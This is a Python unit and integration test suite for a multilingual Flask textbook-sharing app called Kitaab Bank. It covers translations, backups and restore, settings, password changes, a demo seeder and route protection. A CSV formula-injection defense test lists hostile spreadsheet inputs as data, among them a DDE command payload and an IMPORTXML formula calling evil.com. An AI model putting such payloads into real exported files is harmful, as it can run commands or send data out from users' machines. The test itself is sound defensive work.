"""
Phase 8 Unit & Integration Test Suite - Kitaab Bank
Tests:
1. Multilingual Translation Service (Urdu, English, Sindhi & Fallback resolution)
2. Language Switcher route & cookie/session persistence
3. RTL Latin Code Preservation
4. CSV Formula Injection Defense
5. Live Database Hot Backup Engine (Consistent Live Snapshot, SHA-256, Integrity Check)
6. Pre-Restore Safety Rollback & Restoration Engine
7. System Settings & School Profile Management
8. Secure Teacher Password Rotation
9. Exhibition Showcase Demo Seeder (< 1 second execution)
10. Teacher Settings Route Access Control & Protection
"""

import os
import shutil
import sqlite3
import tempfile
import unittest
from pathlib import Path
from flask import session

from app import create_app
from app.database import get_db, init_db
from app.services import (
    translation_service,
    backup_service,
    settings_service,
    analytics_service,
    activity_service
)
from scripts.seed_demo import reset_and_seed_demo_data

class Phase8ComprehensiveTestCase(unittest.TestCase):
    def setUp(self):
        """Set up an isolated temporary database and app instance."""
        self.temp_dir = tempfile.mkdtemp()
        self.db_path = Path(self.temp_dir) / 'test_kitaab_bank.db'
        self.backup_dir = Path(self.temp_dir) / 'backups'
        self.backup_dir.mkdir(parents=True, exist_ok=True)

        self.app = create_app('development')
        self.app.config.update({
            'TESTING': True,
            'DATABASE_PATH': self.db_path,
            'BACKUP_FOLDER': self.backup_dir,
            'WTF_CSRF_ENABLED': False,
            'SERVER_NAME': 'localhost'
        })

        init_db(self.app)
        self.client = self.app.test_client()

    def tearDown(self):
        """Clean up temporary test directory."""
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    # -------------------------------------------------------------------------
    # 1. Multilingual Translation Service Tests
    # -------------------------------------------------------------------------
    def test_translation_languages_and_metadata(self):
        """Verify supported languages, native names, and reading directions."""
        langs = translation_service.SUPPORTED_LANGUAGES
        self.assertIn('en', langs)
        self.assertIn('ur', langs)
        self.assertIn('sd', langs)

        self.assertEqual(langs['en']['dir'], 'ltr')
        self.assertEqual(langs['ur']['dir'], 'rtl')
        self.assertEqual(langs['sd']['dir'], 'rtl')

        self.assertEqual(langs['ur']['native_name'], 'اردو')
        self.assertEqual(langs['sd']['native_name'], 'سنڌي')

    def test_translation_lookups_and_fallback(self):
        """Verify translation dictionary lookups and English fallback."""
        # Known keys in en, ur, sd
        en_title = translation_service.translate('app_name', lang='en')
        ur_title = translation_service.translate('app_name', lang='ur')
        sd_title = translation_service.translate('app_name', lang='sd')

        self.assertEqual(en_title, 'Kitaab Bank')
        self.assertEqual(ur_title, 'کتاب بینک')
        self.assertEqual(sd_title, 'ڪتاب بئنڪ')

        # Fallback to English when key missing in Urdu or Sindhi
        fallback_val = translation_service.translate('only_in_en_test_key_xyz', lang='ur', default='Default Value')
        self.assertEqual(fallback_val, 'Default Value')

        # Fallback to key when no default provided
        fallback_key = translation_service.translate('nonexistent_key_123', lang='sd')
        self.assertEqual(fallback_key, 'nonexistent_key_123')

    def test_language_switch_route_and_persistence(self):
        """Verify GET /set-language/<lang> sets session and cookie correctly."""
        with self.client:
            resp = self.client.get('/set-language/ur')
            self.assertEqual(resp.status_code, 302)
            self.assertEqual(session.get('lang'), 'ur')
            self.assertIn('kb_lang=ur', resp.headers.get('Set-Cookie', ''))

            # Invalid language should fallback to 'en'
            resp2 = self.client.get('/set-language/invalid_lang')
            self.assertEqual(resp2.status_code, 302)
            self.assertEqual(session.get('lang'), 'en')

    # -------------------------------------------------------------------------
    # 2. RTL Latin Code Preservation
    # -------------------------------------------------------------------------
    def test_latin_code_preservation(self):
        """Ensure book, tracking, and handover codes preserve Latin characters and hyphens."""
        codes = [
            'KB-BK-000001',
            'KB-REQ-7K9M-2X4P',
            'KB-HO-000001',
            'KB-DON-20261105-001'
        ]
        for c in codes:
            # Codes must remain strictly ASCII/Latin without translation alteration
            self.assertTrue(c.isascii())
            self.assertTrue(c.startswith('KB-'))

    # -------------------------------------------------------------------------
    # 3. CSV Formula Injection Defense
    # -------------------------------------------------------------------------
    def test_csv_formula_injection_defense(self):
        """Verify malicious formula prefixes (=, +, -, @, tabs) are neutralized with single quote."""
        malicious_inputs = [
            "=SUM(A1:A10)",
            "+cmd|' /C calc'!A0",
            "-2+3*[1]!A1",
            "@IMPORTXML('http://evil.com','//a')",
            "\tTAB_INJECTION",
            "\rCR_INJECTION"
        ]
        for val in malicious_inputs:
            sanitized = analytics_service.sanitize_csv_cell(val)
            self.assertTrue(sanitized.startswith("'"), f"Failed to sanitize: {val} -> {sanitized}")

        safe_inputs = [
            "Mathematics Class 6",
            "Prof. Tariq Mahmood",
            "KB-BK-000001",
            "Class 8"
        ]
        for safe in safe_inputs:
            sanitized = analytics_service.sanitize_csv_cell(safe)
            self.assertEqual(sanitized, safe)

    # -------------------------------------------------------------------------
    # 4. Live Snapshot Hot Backup Engine & Integrity Verification
    # -------------------------------------------------------------------------
    def test_live_hot_backup_creation_and_checksum(self):
        """Verify live snapshot creation, SHA-256 calculation, and PRAGMA integrity check."""
        with self.app.app_context():
            success, record, error = backup_service.create_database_backup(
                created_by_id=1,
                teacher_name="Test Incharge"
            )
            self.assertTrue(success, f"Backup failed: {error}")
            self.assertIsNotNone(record)
            self.assertEqual(record['verification_status'], 'VALID')
            self.assertTrue(record['file_size_bytes'] > 0)
            self.assertEqual(len(record['checksum_sha256']), 64)

            # Verify file exists on disk in backup directory
            backup_file = self.backup_dir / record['filename']
            self.assertTrue(backup_file.exists())

            # Verify record was cataloged in SQLite backup_records table
            backups = backup_service.get_all_backups()
            self.assertGreaterEqual(len(backups), 1)
            self.assertEqual(backups[0]['filename'], record['filename'])
            self.assertEqual(backups[0]['verification_status'], 'VALID')

    def test_backup_deletion(self):
        """Verify deleting a backup removes file and database catalog record."""
        with self.app.app_context():
            # Create another backup so deleting this one does not violate the sole backup safety guard
            s0, _, _ = backup_service.create_database_backup()
            self.assertTrue(s0)
            success, record, _ = backup_service.create_database_backup()
            self.assertTrue(success)
            backup_id = record['id']
            filename = record['filename']
            file_path = self.backup_dir / filename
            self.assertTrue(file_path.exists())

            del_ok, err = backup_service.delete_backup(backup_id, teacher_name="Test Teacher")
            self.assertTrue(del_ok, f"Delete failed: {err}")
            self.assertFalse(file_path.exists())

            # Verify removed from database
            retrieved = backup_service.get_backup_by_id(backup_id)
            self.assertIsNone(retrieved)

    # -------------------------------------------------------------------------
    # 5. Pre-Restore Safety Rollback & Database Restoration
    # -------------------------------------------------------------------------
    def test_database_restoration_with_pre_restore_safety_copy(self):
        """Verify restoration creates a pre_restore snapshot and restores data accurately."""
        with self.app.app_context():
            db = get_db()
            # Insert a unique marker record before backup
            db.execute(
                "INSERT INTO books (book_code, title, author, subject, class_grade, language, publisher, edition_year, condition_state, image_path, status) "
                "VALUES ('KB-BK-BACKUP-TEST', 'Original Snapshot Book', 'Author A', 'Math', 'Class 6', 'English', 'Pub', 2026, 'Good', 'img/covers/placeholder.svg', 'available');"
            )
            db.commit()

            # Create backup
            bck_ok, bck_record, _ = backup_service.create_database_backup()
            self.assertTrue(bck_ok)

            # Mutate database (delete book)
            db.execute("DELETE FROM books WHERE book_code = 'KB-BK-BACKUP-TEST';")
            db.commit()

            cur = db.cursor()
            cur.execute("SELECT COUNT(*) FROM books WHERE book_code = 'KB-BK-BACKUP-TEST';")
            self.assertEqual(cur.fetchone()[0], 0)

            # Restore from backup
            res_ok, pre_restore_file, res_err = backup_service.restore_database_from_backup(bck_record['id'])
            self.assertTrue(res_ok, f"Restore failed: {res_err}")
            self.assertIsNotNone(pre_restore_file)

            # Verify pre_restore file exists
            pre_restore_path = self.backup_dir / pre_restore_file
            self.assertTrue(pre_restore_path.exists())

            # Verify restored data contains original book
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("SELECT title FROM books WHERE book_code = 'KB-BK-BACKUP-TEST';")
            row = c.fetchone()
            conn.close()
            self.assertIsNotNone(row)
            self.assertEqual(row[0], 'Original Snapshot Book')

    # -------------------------------------------------------------------------
    # 6. System Settings & School Profile Management
    # -------------------------------------------------------------------------
    def test_settings_service_profile_updates(self):
        """Verify school profile metadata can be read and updated."""
        with self.app.app_context():
            settings = settings_service.get_system_settings()
            self.assertIn('school_name', settings)
            self.assertIn('academic_year', settings)

            ok, err = settings_service.update_school_profile(
                school_name="Sindh Model High School",
                academic_year="2026-2028",
                default_language="ur",
                updated_by_id=1,
                updated_by_name="Headmaster"
            )
            self.assertTrue(ok, f"Update profile failed: {err}")

            updated_settings = settings_service.get_system_settings()
            self.assertEqual(updated_settings['school_name'], "Sindh Model High School")
            self.assertEqual(updated_settings['academic_year'], "2026-2028")
            self.assertEqual(updated_settings['default_language'], "ur")

            # Validation errors
            bad_ok, _ = settings_service.update_school_profile("", "2026", "en")
            self.assertFalse(bad_ok)

            bad_lang, _ = settings_service.update_school_profile("School", "2026", "invalid_lang")
            self.assertFalse(bad_lang)

    # -------------------------------------------------------------------------
    # 7. Secure Teacher Password Rotation
    # -------------------------------------------------------------------------
    def test_teacher_password_change(self):
        """Verify teacher password rotation requires correct current password and minimum length."""
        with self.app.app_context():
            db = get_db()
            cur = db.cursor()
            cur.execute("SELECT id FROM teachers WHERE username = 'teacher';")
            teacher_id = cur.fetchone()[0]

            # Wrong current password fails
            bad_curr, _ = settings_service.change_teacher_password(
                teacher_id=teacher_id,
                current_password="WrongPassword123",
                new_password="NewSecurePassword@2026",
                confirm_password="NewSecurePassword@2026"
            )
            self.assertFalse(bad_curr)

            # Mismatched confirmation fails
            mismatch, _ = settings_service.change_teacher_password(
                teacher_id=teacher_id,
                current_password="Teacher@123",
                new_password="NewSecurePassword@2026",
                confirm_password="DifferentPassword@2026"
            )
            self.assertFalse(mismatch)

            # Short password (< 8 chars) fails
            too_short, _ = settings_service.change_teacher_password(
                teacher_id=teacher_id,
                current_password="Teacher@123",
                new_password="short",
                confirm_password="short"
            )
            self.assertFalse(too_short)

            # Valid rotation succeeds
            ok, err = settings_service.change_teacher_password(
                teacher_id=teacher_id,
                current_password="Teacher@123",
                new_password="NewSecurePassword@2026",
                confirm_password="NewSecurePassword@2026"
            )
            self.assertTrue(ok, f"Password change failed: {err}")

            # Verify login with new password works
            from werkzeug.security import check_password_hash
            cur.execute("SELECT password_hash FROM teachers WHERE id = ?;", (teacher_id,))
            new_hash = cur.fetchone()[0]
            self.assertTrue(check_password_hash(new_hash, "NewSecurePassword@2026"))
            self.assertFalse(check_password_hash(new_hash, "Teacher@123"))

    # -------------------------------------------------------------------------
    # 8. Exhibition Showcase Demo Seeder (< 1 second execution)
    # -------------------------------------------------------------------------
    def test_exhibition_demo_seeder_performance_and_records(self):
        """Verify reset_and_seed_demo_data runs in < 1 second and populates all 18 textbooks and records."""
        import time
        start_time = time.time()
        success = reset_and_seed_demo_data(target_db=self.db_path)
        duration = time.time() - start_time

        self.assertTrue(success)
        self.assertLess(duration, 1.0, f"Seeding exceeded 1.0s limit: {duration:.3f}s")

        # Verify dataset
        conn = sqlite3.connect(self.db_path)
        cur = conn.cursor()

        cur.execute("SELECT COUNT(*) FROM books;")
        self.assertEqual(cur.fetchone()[0], 18)

        cur.execute("SELECT COUNT(*) FROM books WHERE status = 'available';")
        self.assertEqual(cur.fetchone()[0], 13)

        cur.execute("SELECT COUNT(*) FROM books WHERE status = 'reserved';")
        self.assertEqual(cur.fetchone()[0], 3)

        cur.execute("SELECT COUNT(*) FROM books WHERE status = 'handed_over';")
        self.assertEqual(cur.fetchone()[0], 2)

        cur.execute("SELECT COUNT(*) FROM donations;")
        self.assertEqual(cur.fetchone()[0], 3)

        cur.execute("SELECT COUNT(*) FROM requests;")
        self.assertEqual(cur.fetchone()[0], 5)

        cur.execute("SELECT COUNT(*) FROM handovers;")
        self.assertEqual(cur.fetchone()[0], 2)

        cur.execute("SELECT COUNT(*) FROM activity_logs;")
        self.assertGreaterEqual(cur.fetchone()[0], 8)

        conn.close()

    # -------------------------------------------------------------------------
    # 9. Teacher Settings Route Access Control & Protection
    # -------------------------------------------------------------------------
    def test_teacher_settings_auth_protection(self):
        """Verify unauthenticated requests to /teacher/settings* redirect to login."""
        endpoints = [
            ('/teacher/settings', 'GET'),
            ('/teacher/settings/profile', 'POST'),
            ('/teacher/settings/password', 'POST'),
            ('/teacher/settings/backup/create', 'POST'),
            ('/teacher/settings/seed-demo', 'POST'),
        ]
        for path, method in endpoints:
            if method == 'GET':
                resp = self.client.get(path)
            else:
                resp = self.client.post(path, data={})
            self.assertEqual(resp.status_code, 302, f"Unauthenticated access allowed for {method} {path}")
            self.assertIn('/auth/login', resp.headers['Location'])

    def test_teacher_settings_authenticated_views_and_actions(self):
        """Verify authenticated teacher can access tabs, create backup, and update profile."""
        with self.client:
            # Login
            login_resp = self.client.post('/auth/login', data={
                'username': 'teacher',
                'password': 'Teacher@123'
            }, follow_redirects=True)
            self.assertEqual(login_resp.status_code, 200)

            # Access Settings Profile tab
            resp = self.client.get('/teacher/settings?tab=profile')
            self.assertEqual(resp.status_code, 200)
            self.assertIn(b'School Profile & System Preferences', resp.data)

            # Access Security tab
            resp = self.client.get('/teacher/settings?tab=security')
            self.assertEqual(resp.status_code, 200)
            self.assertIn(b'Teacher Account Security', resp.data)

            # Access Backup tab
            resp = self.client.get('/teacher/settings?tab=backup')
            self.assertEqual(resp.status_code, 200)
            self.assertIn(b'Consistent Live Database Backups', resp.data)

            # Access Demo tab
            resp = self.client.get('/teacher/settings?tab=demo')
            self.assertEqual(resp.status_code, 200)
            self.assertIn(b'Exhibition Showcase Mode', resp.data)

            # Create backup via POST
            csrf_token = session.get('csrf_token', '')
            post_bck = self.client.post('/teacher/settings/backup/create', data={
                'csrf_token': csrf_token
            }, follow_redirects=True)
            self.assertEqual(post_bck.status_code, 200)
            self.assertIn(b'Live database backup created successfully', post_bck.data)


if __name__ == '__main__':
    unittest.main()
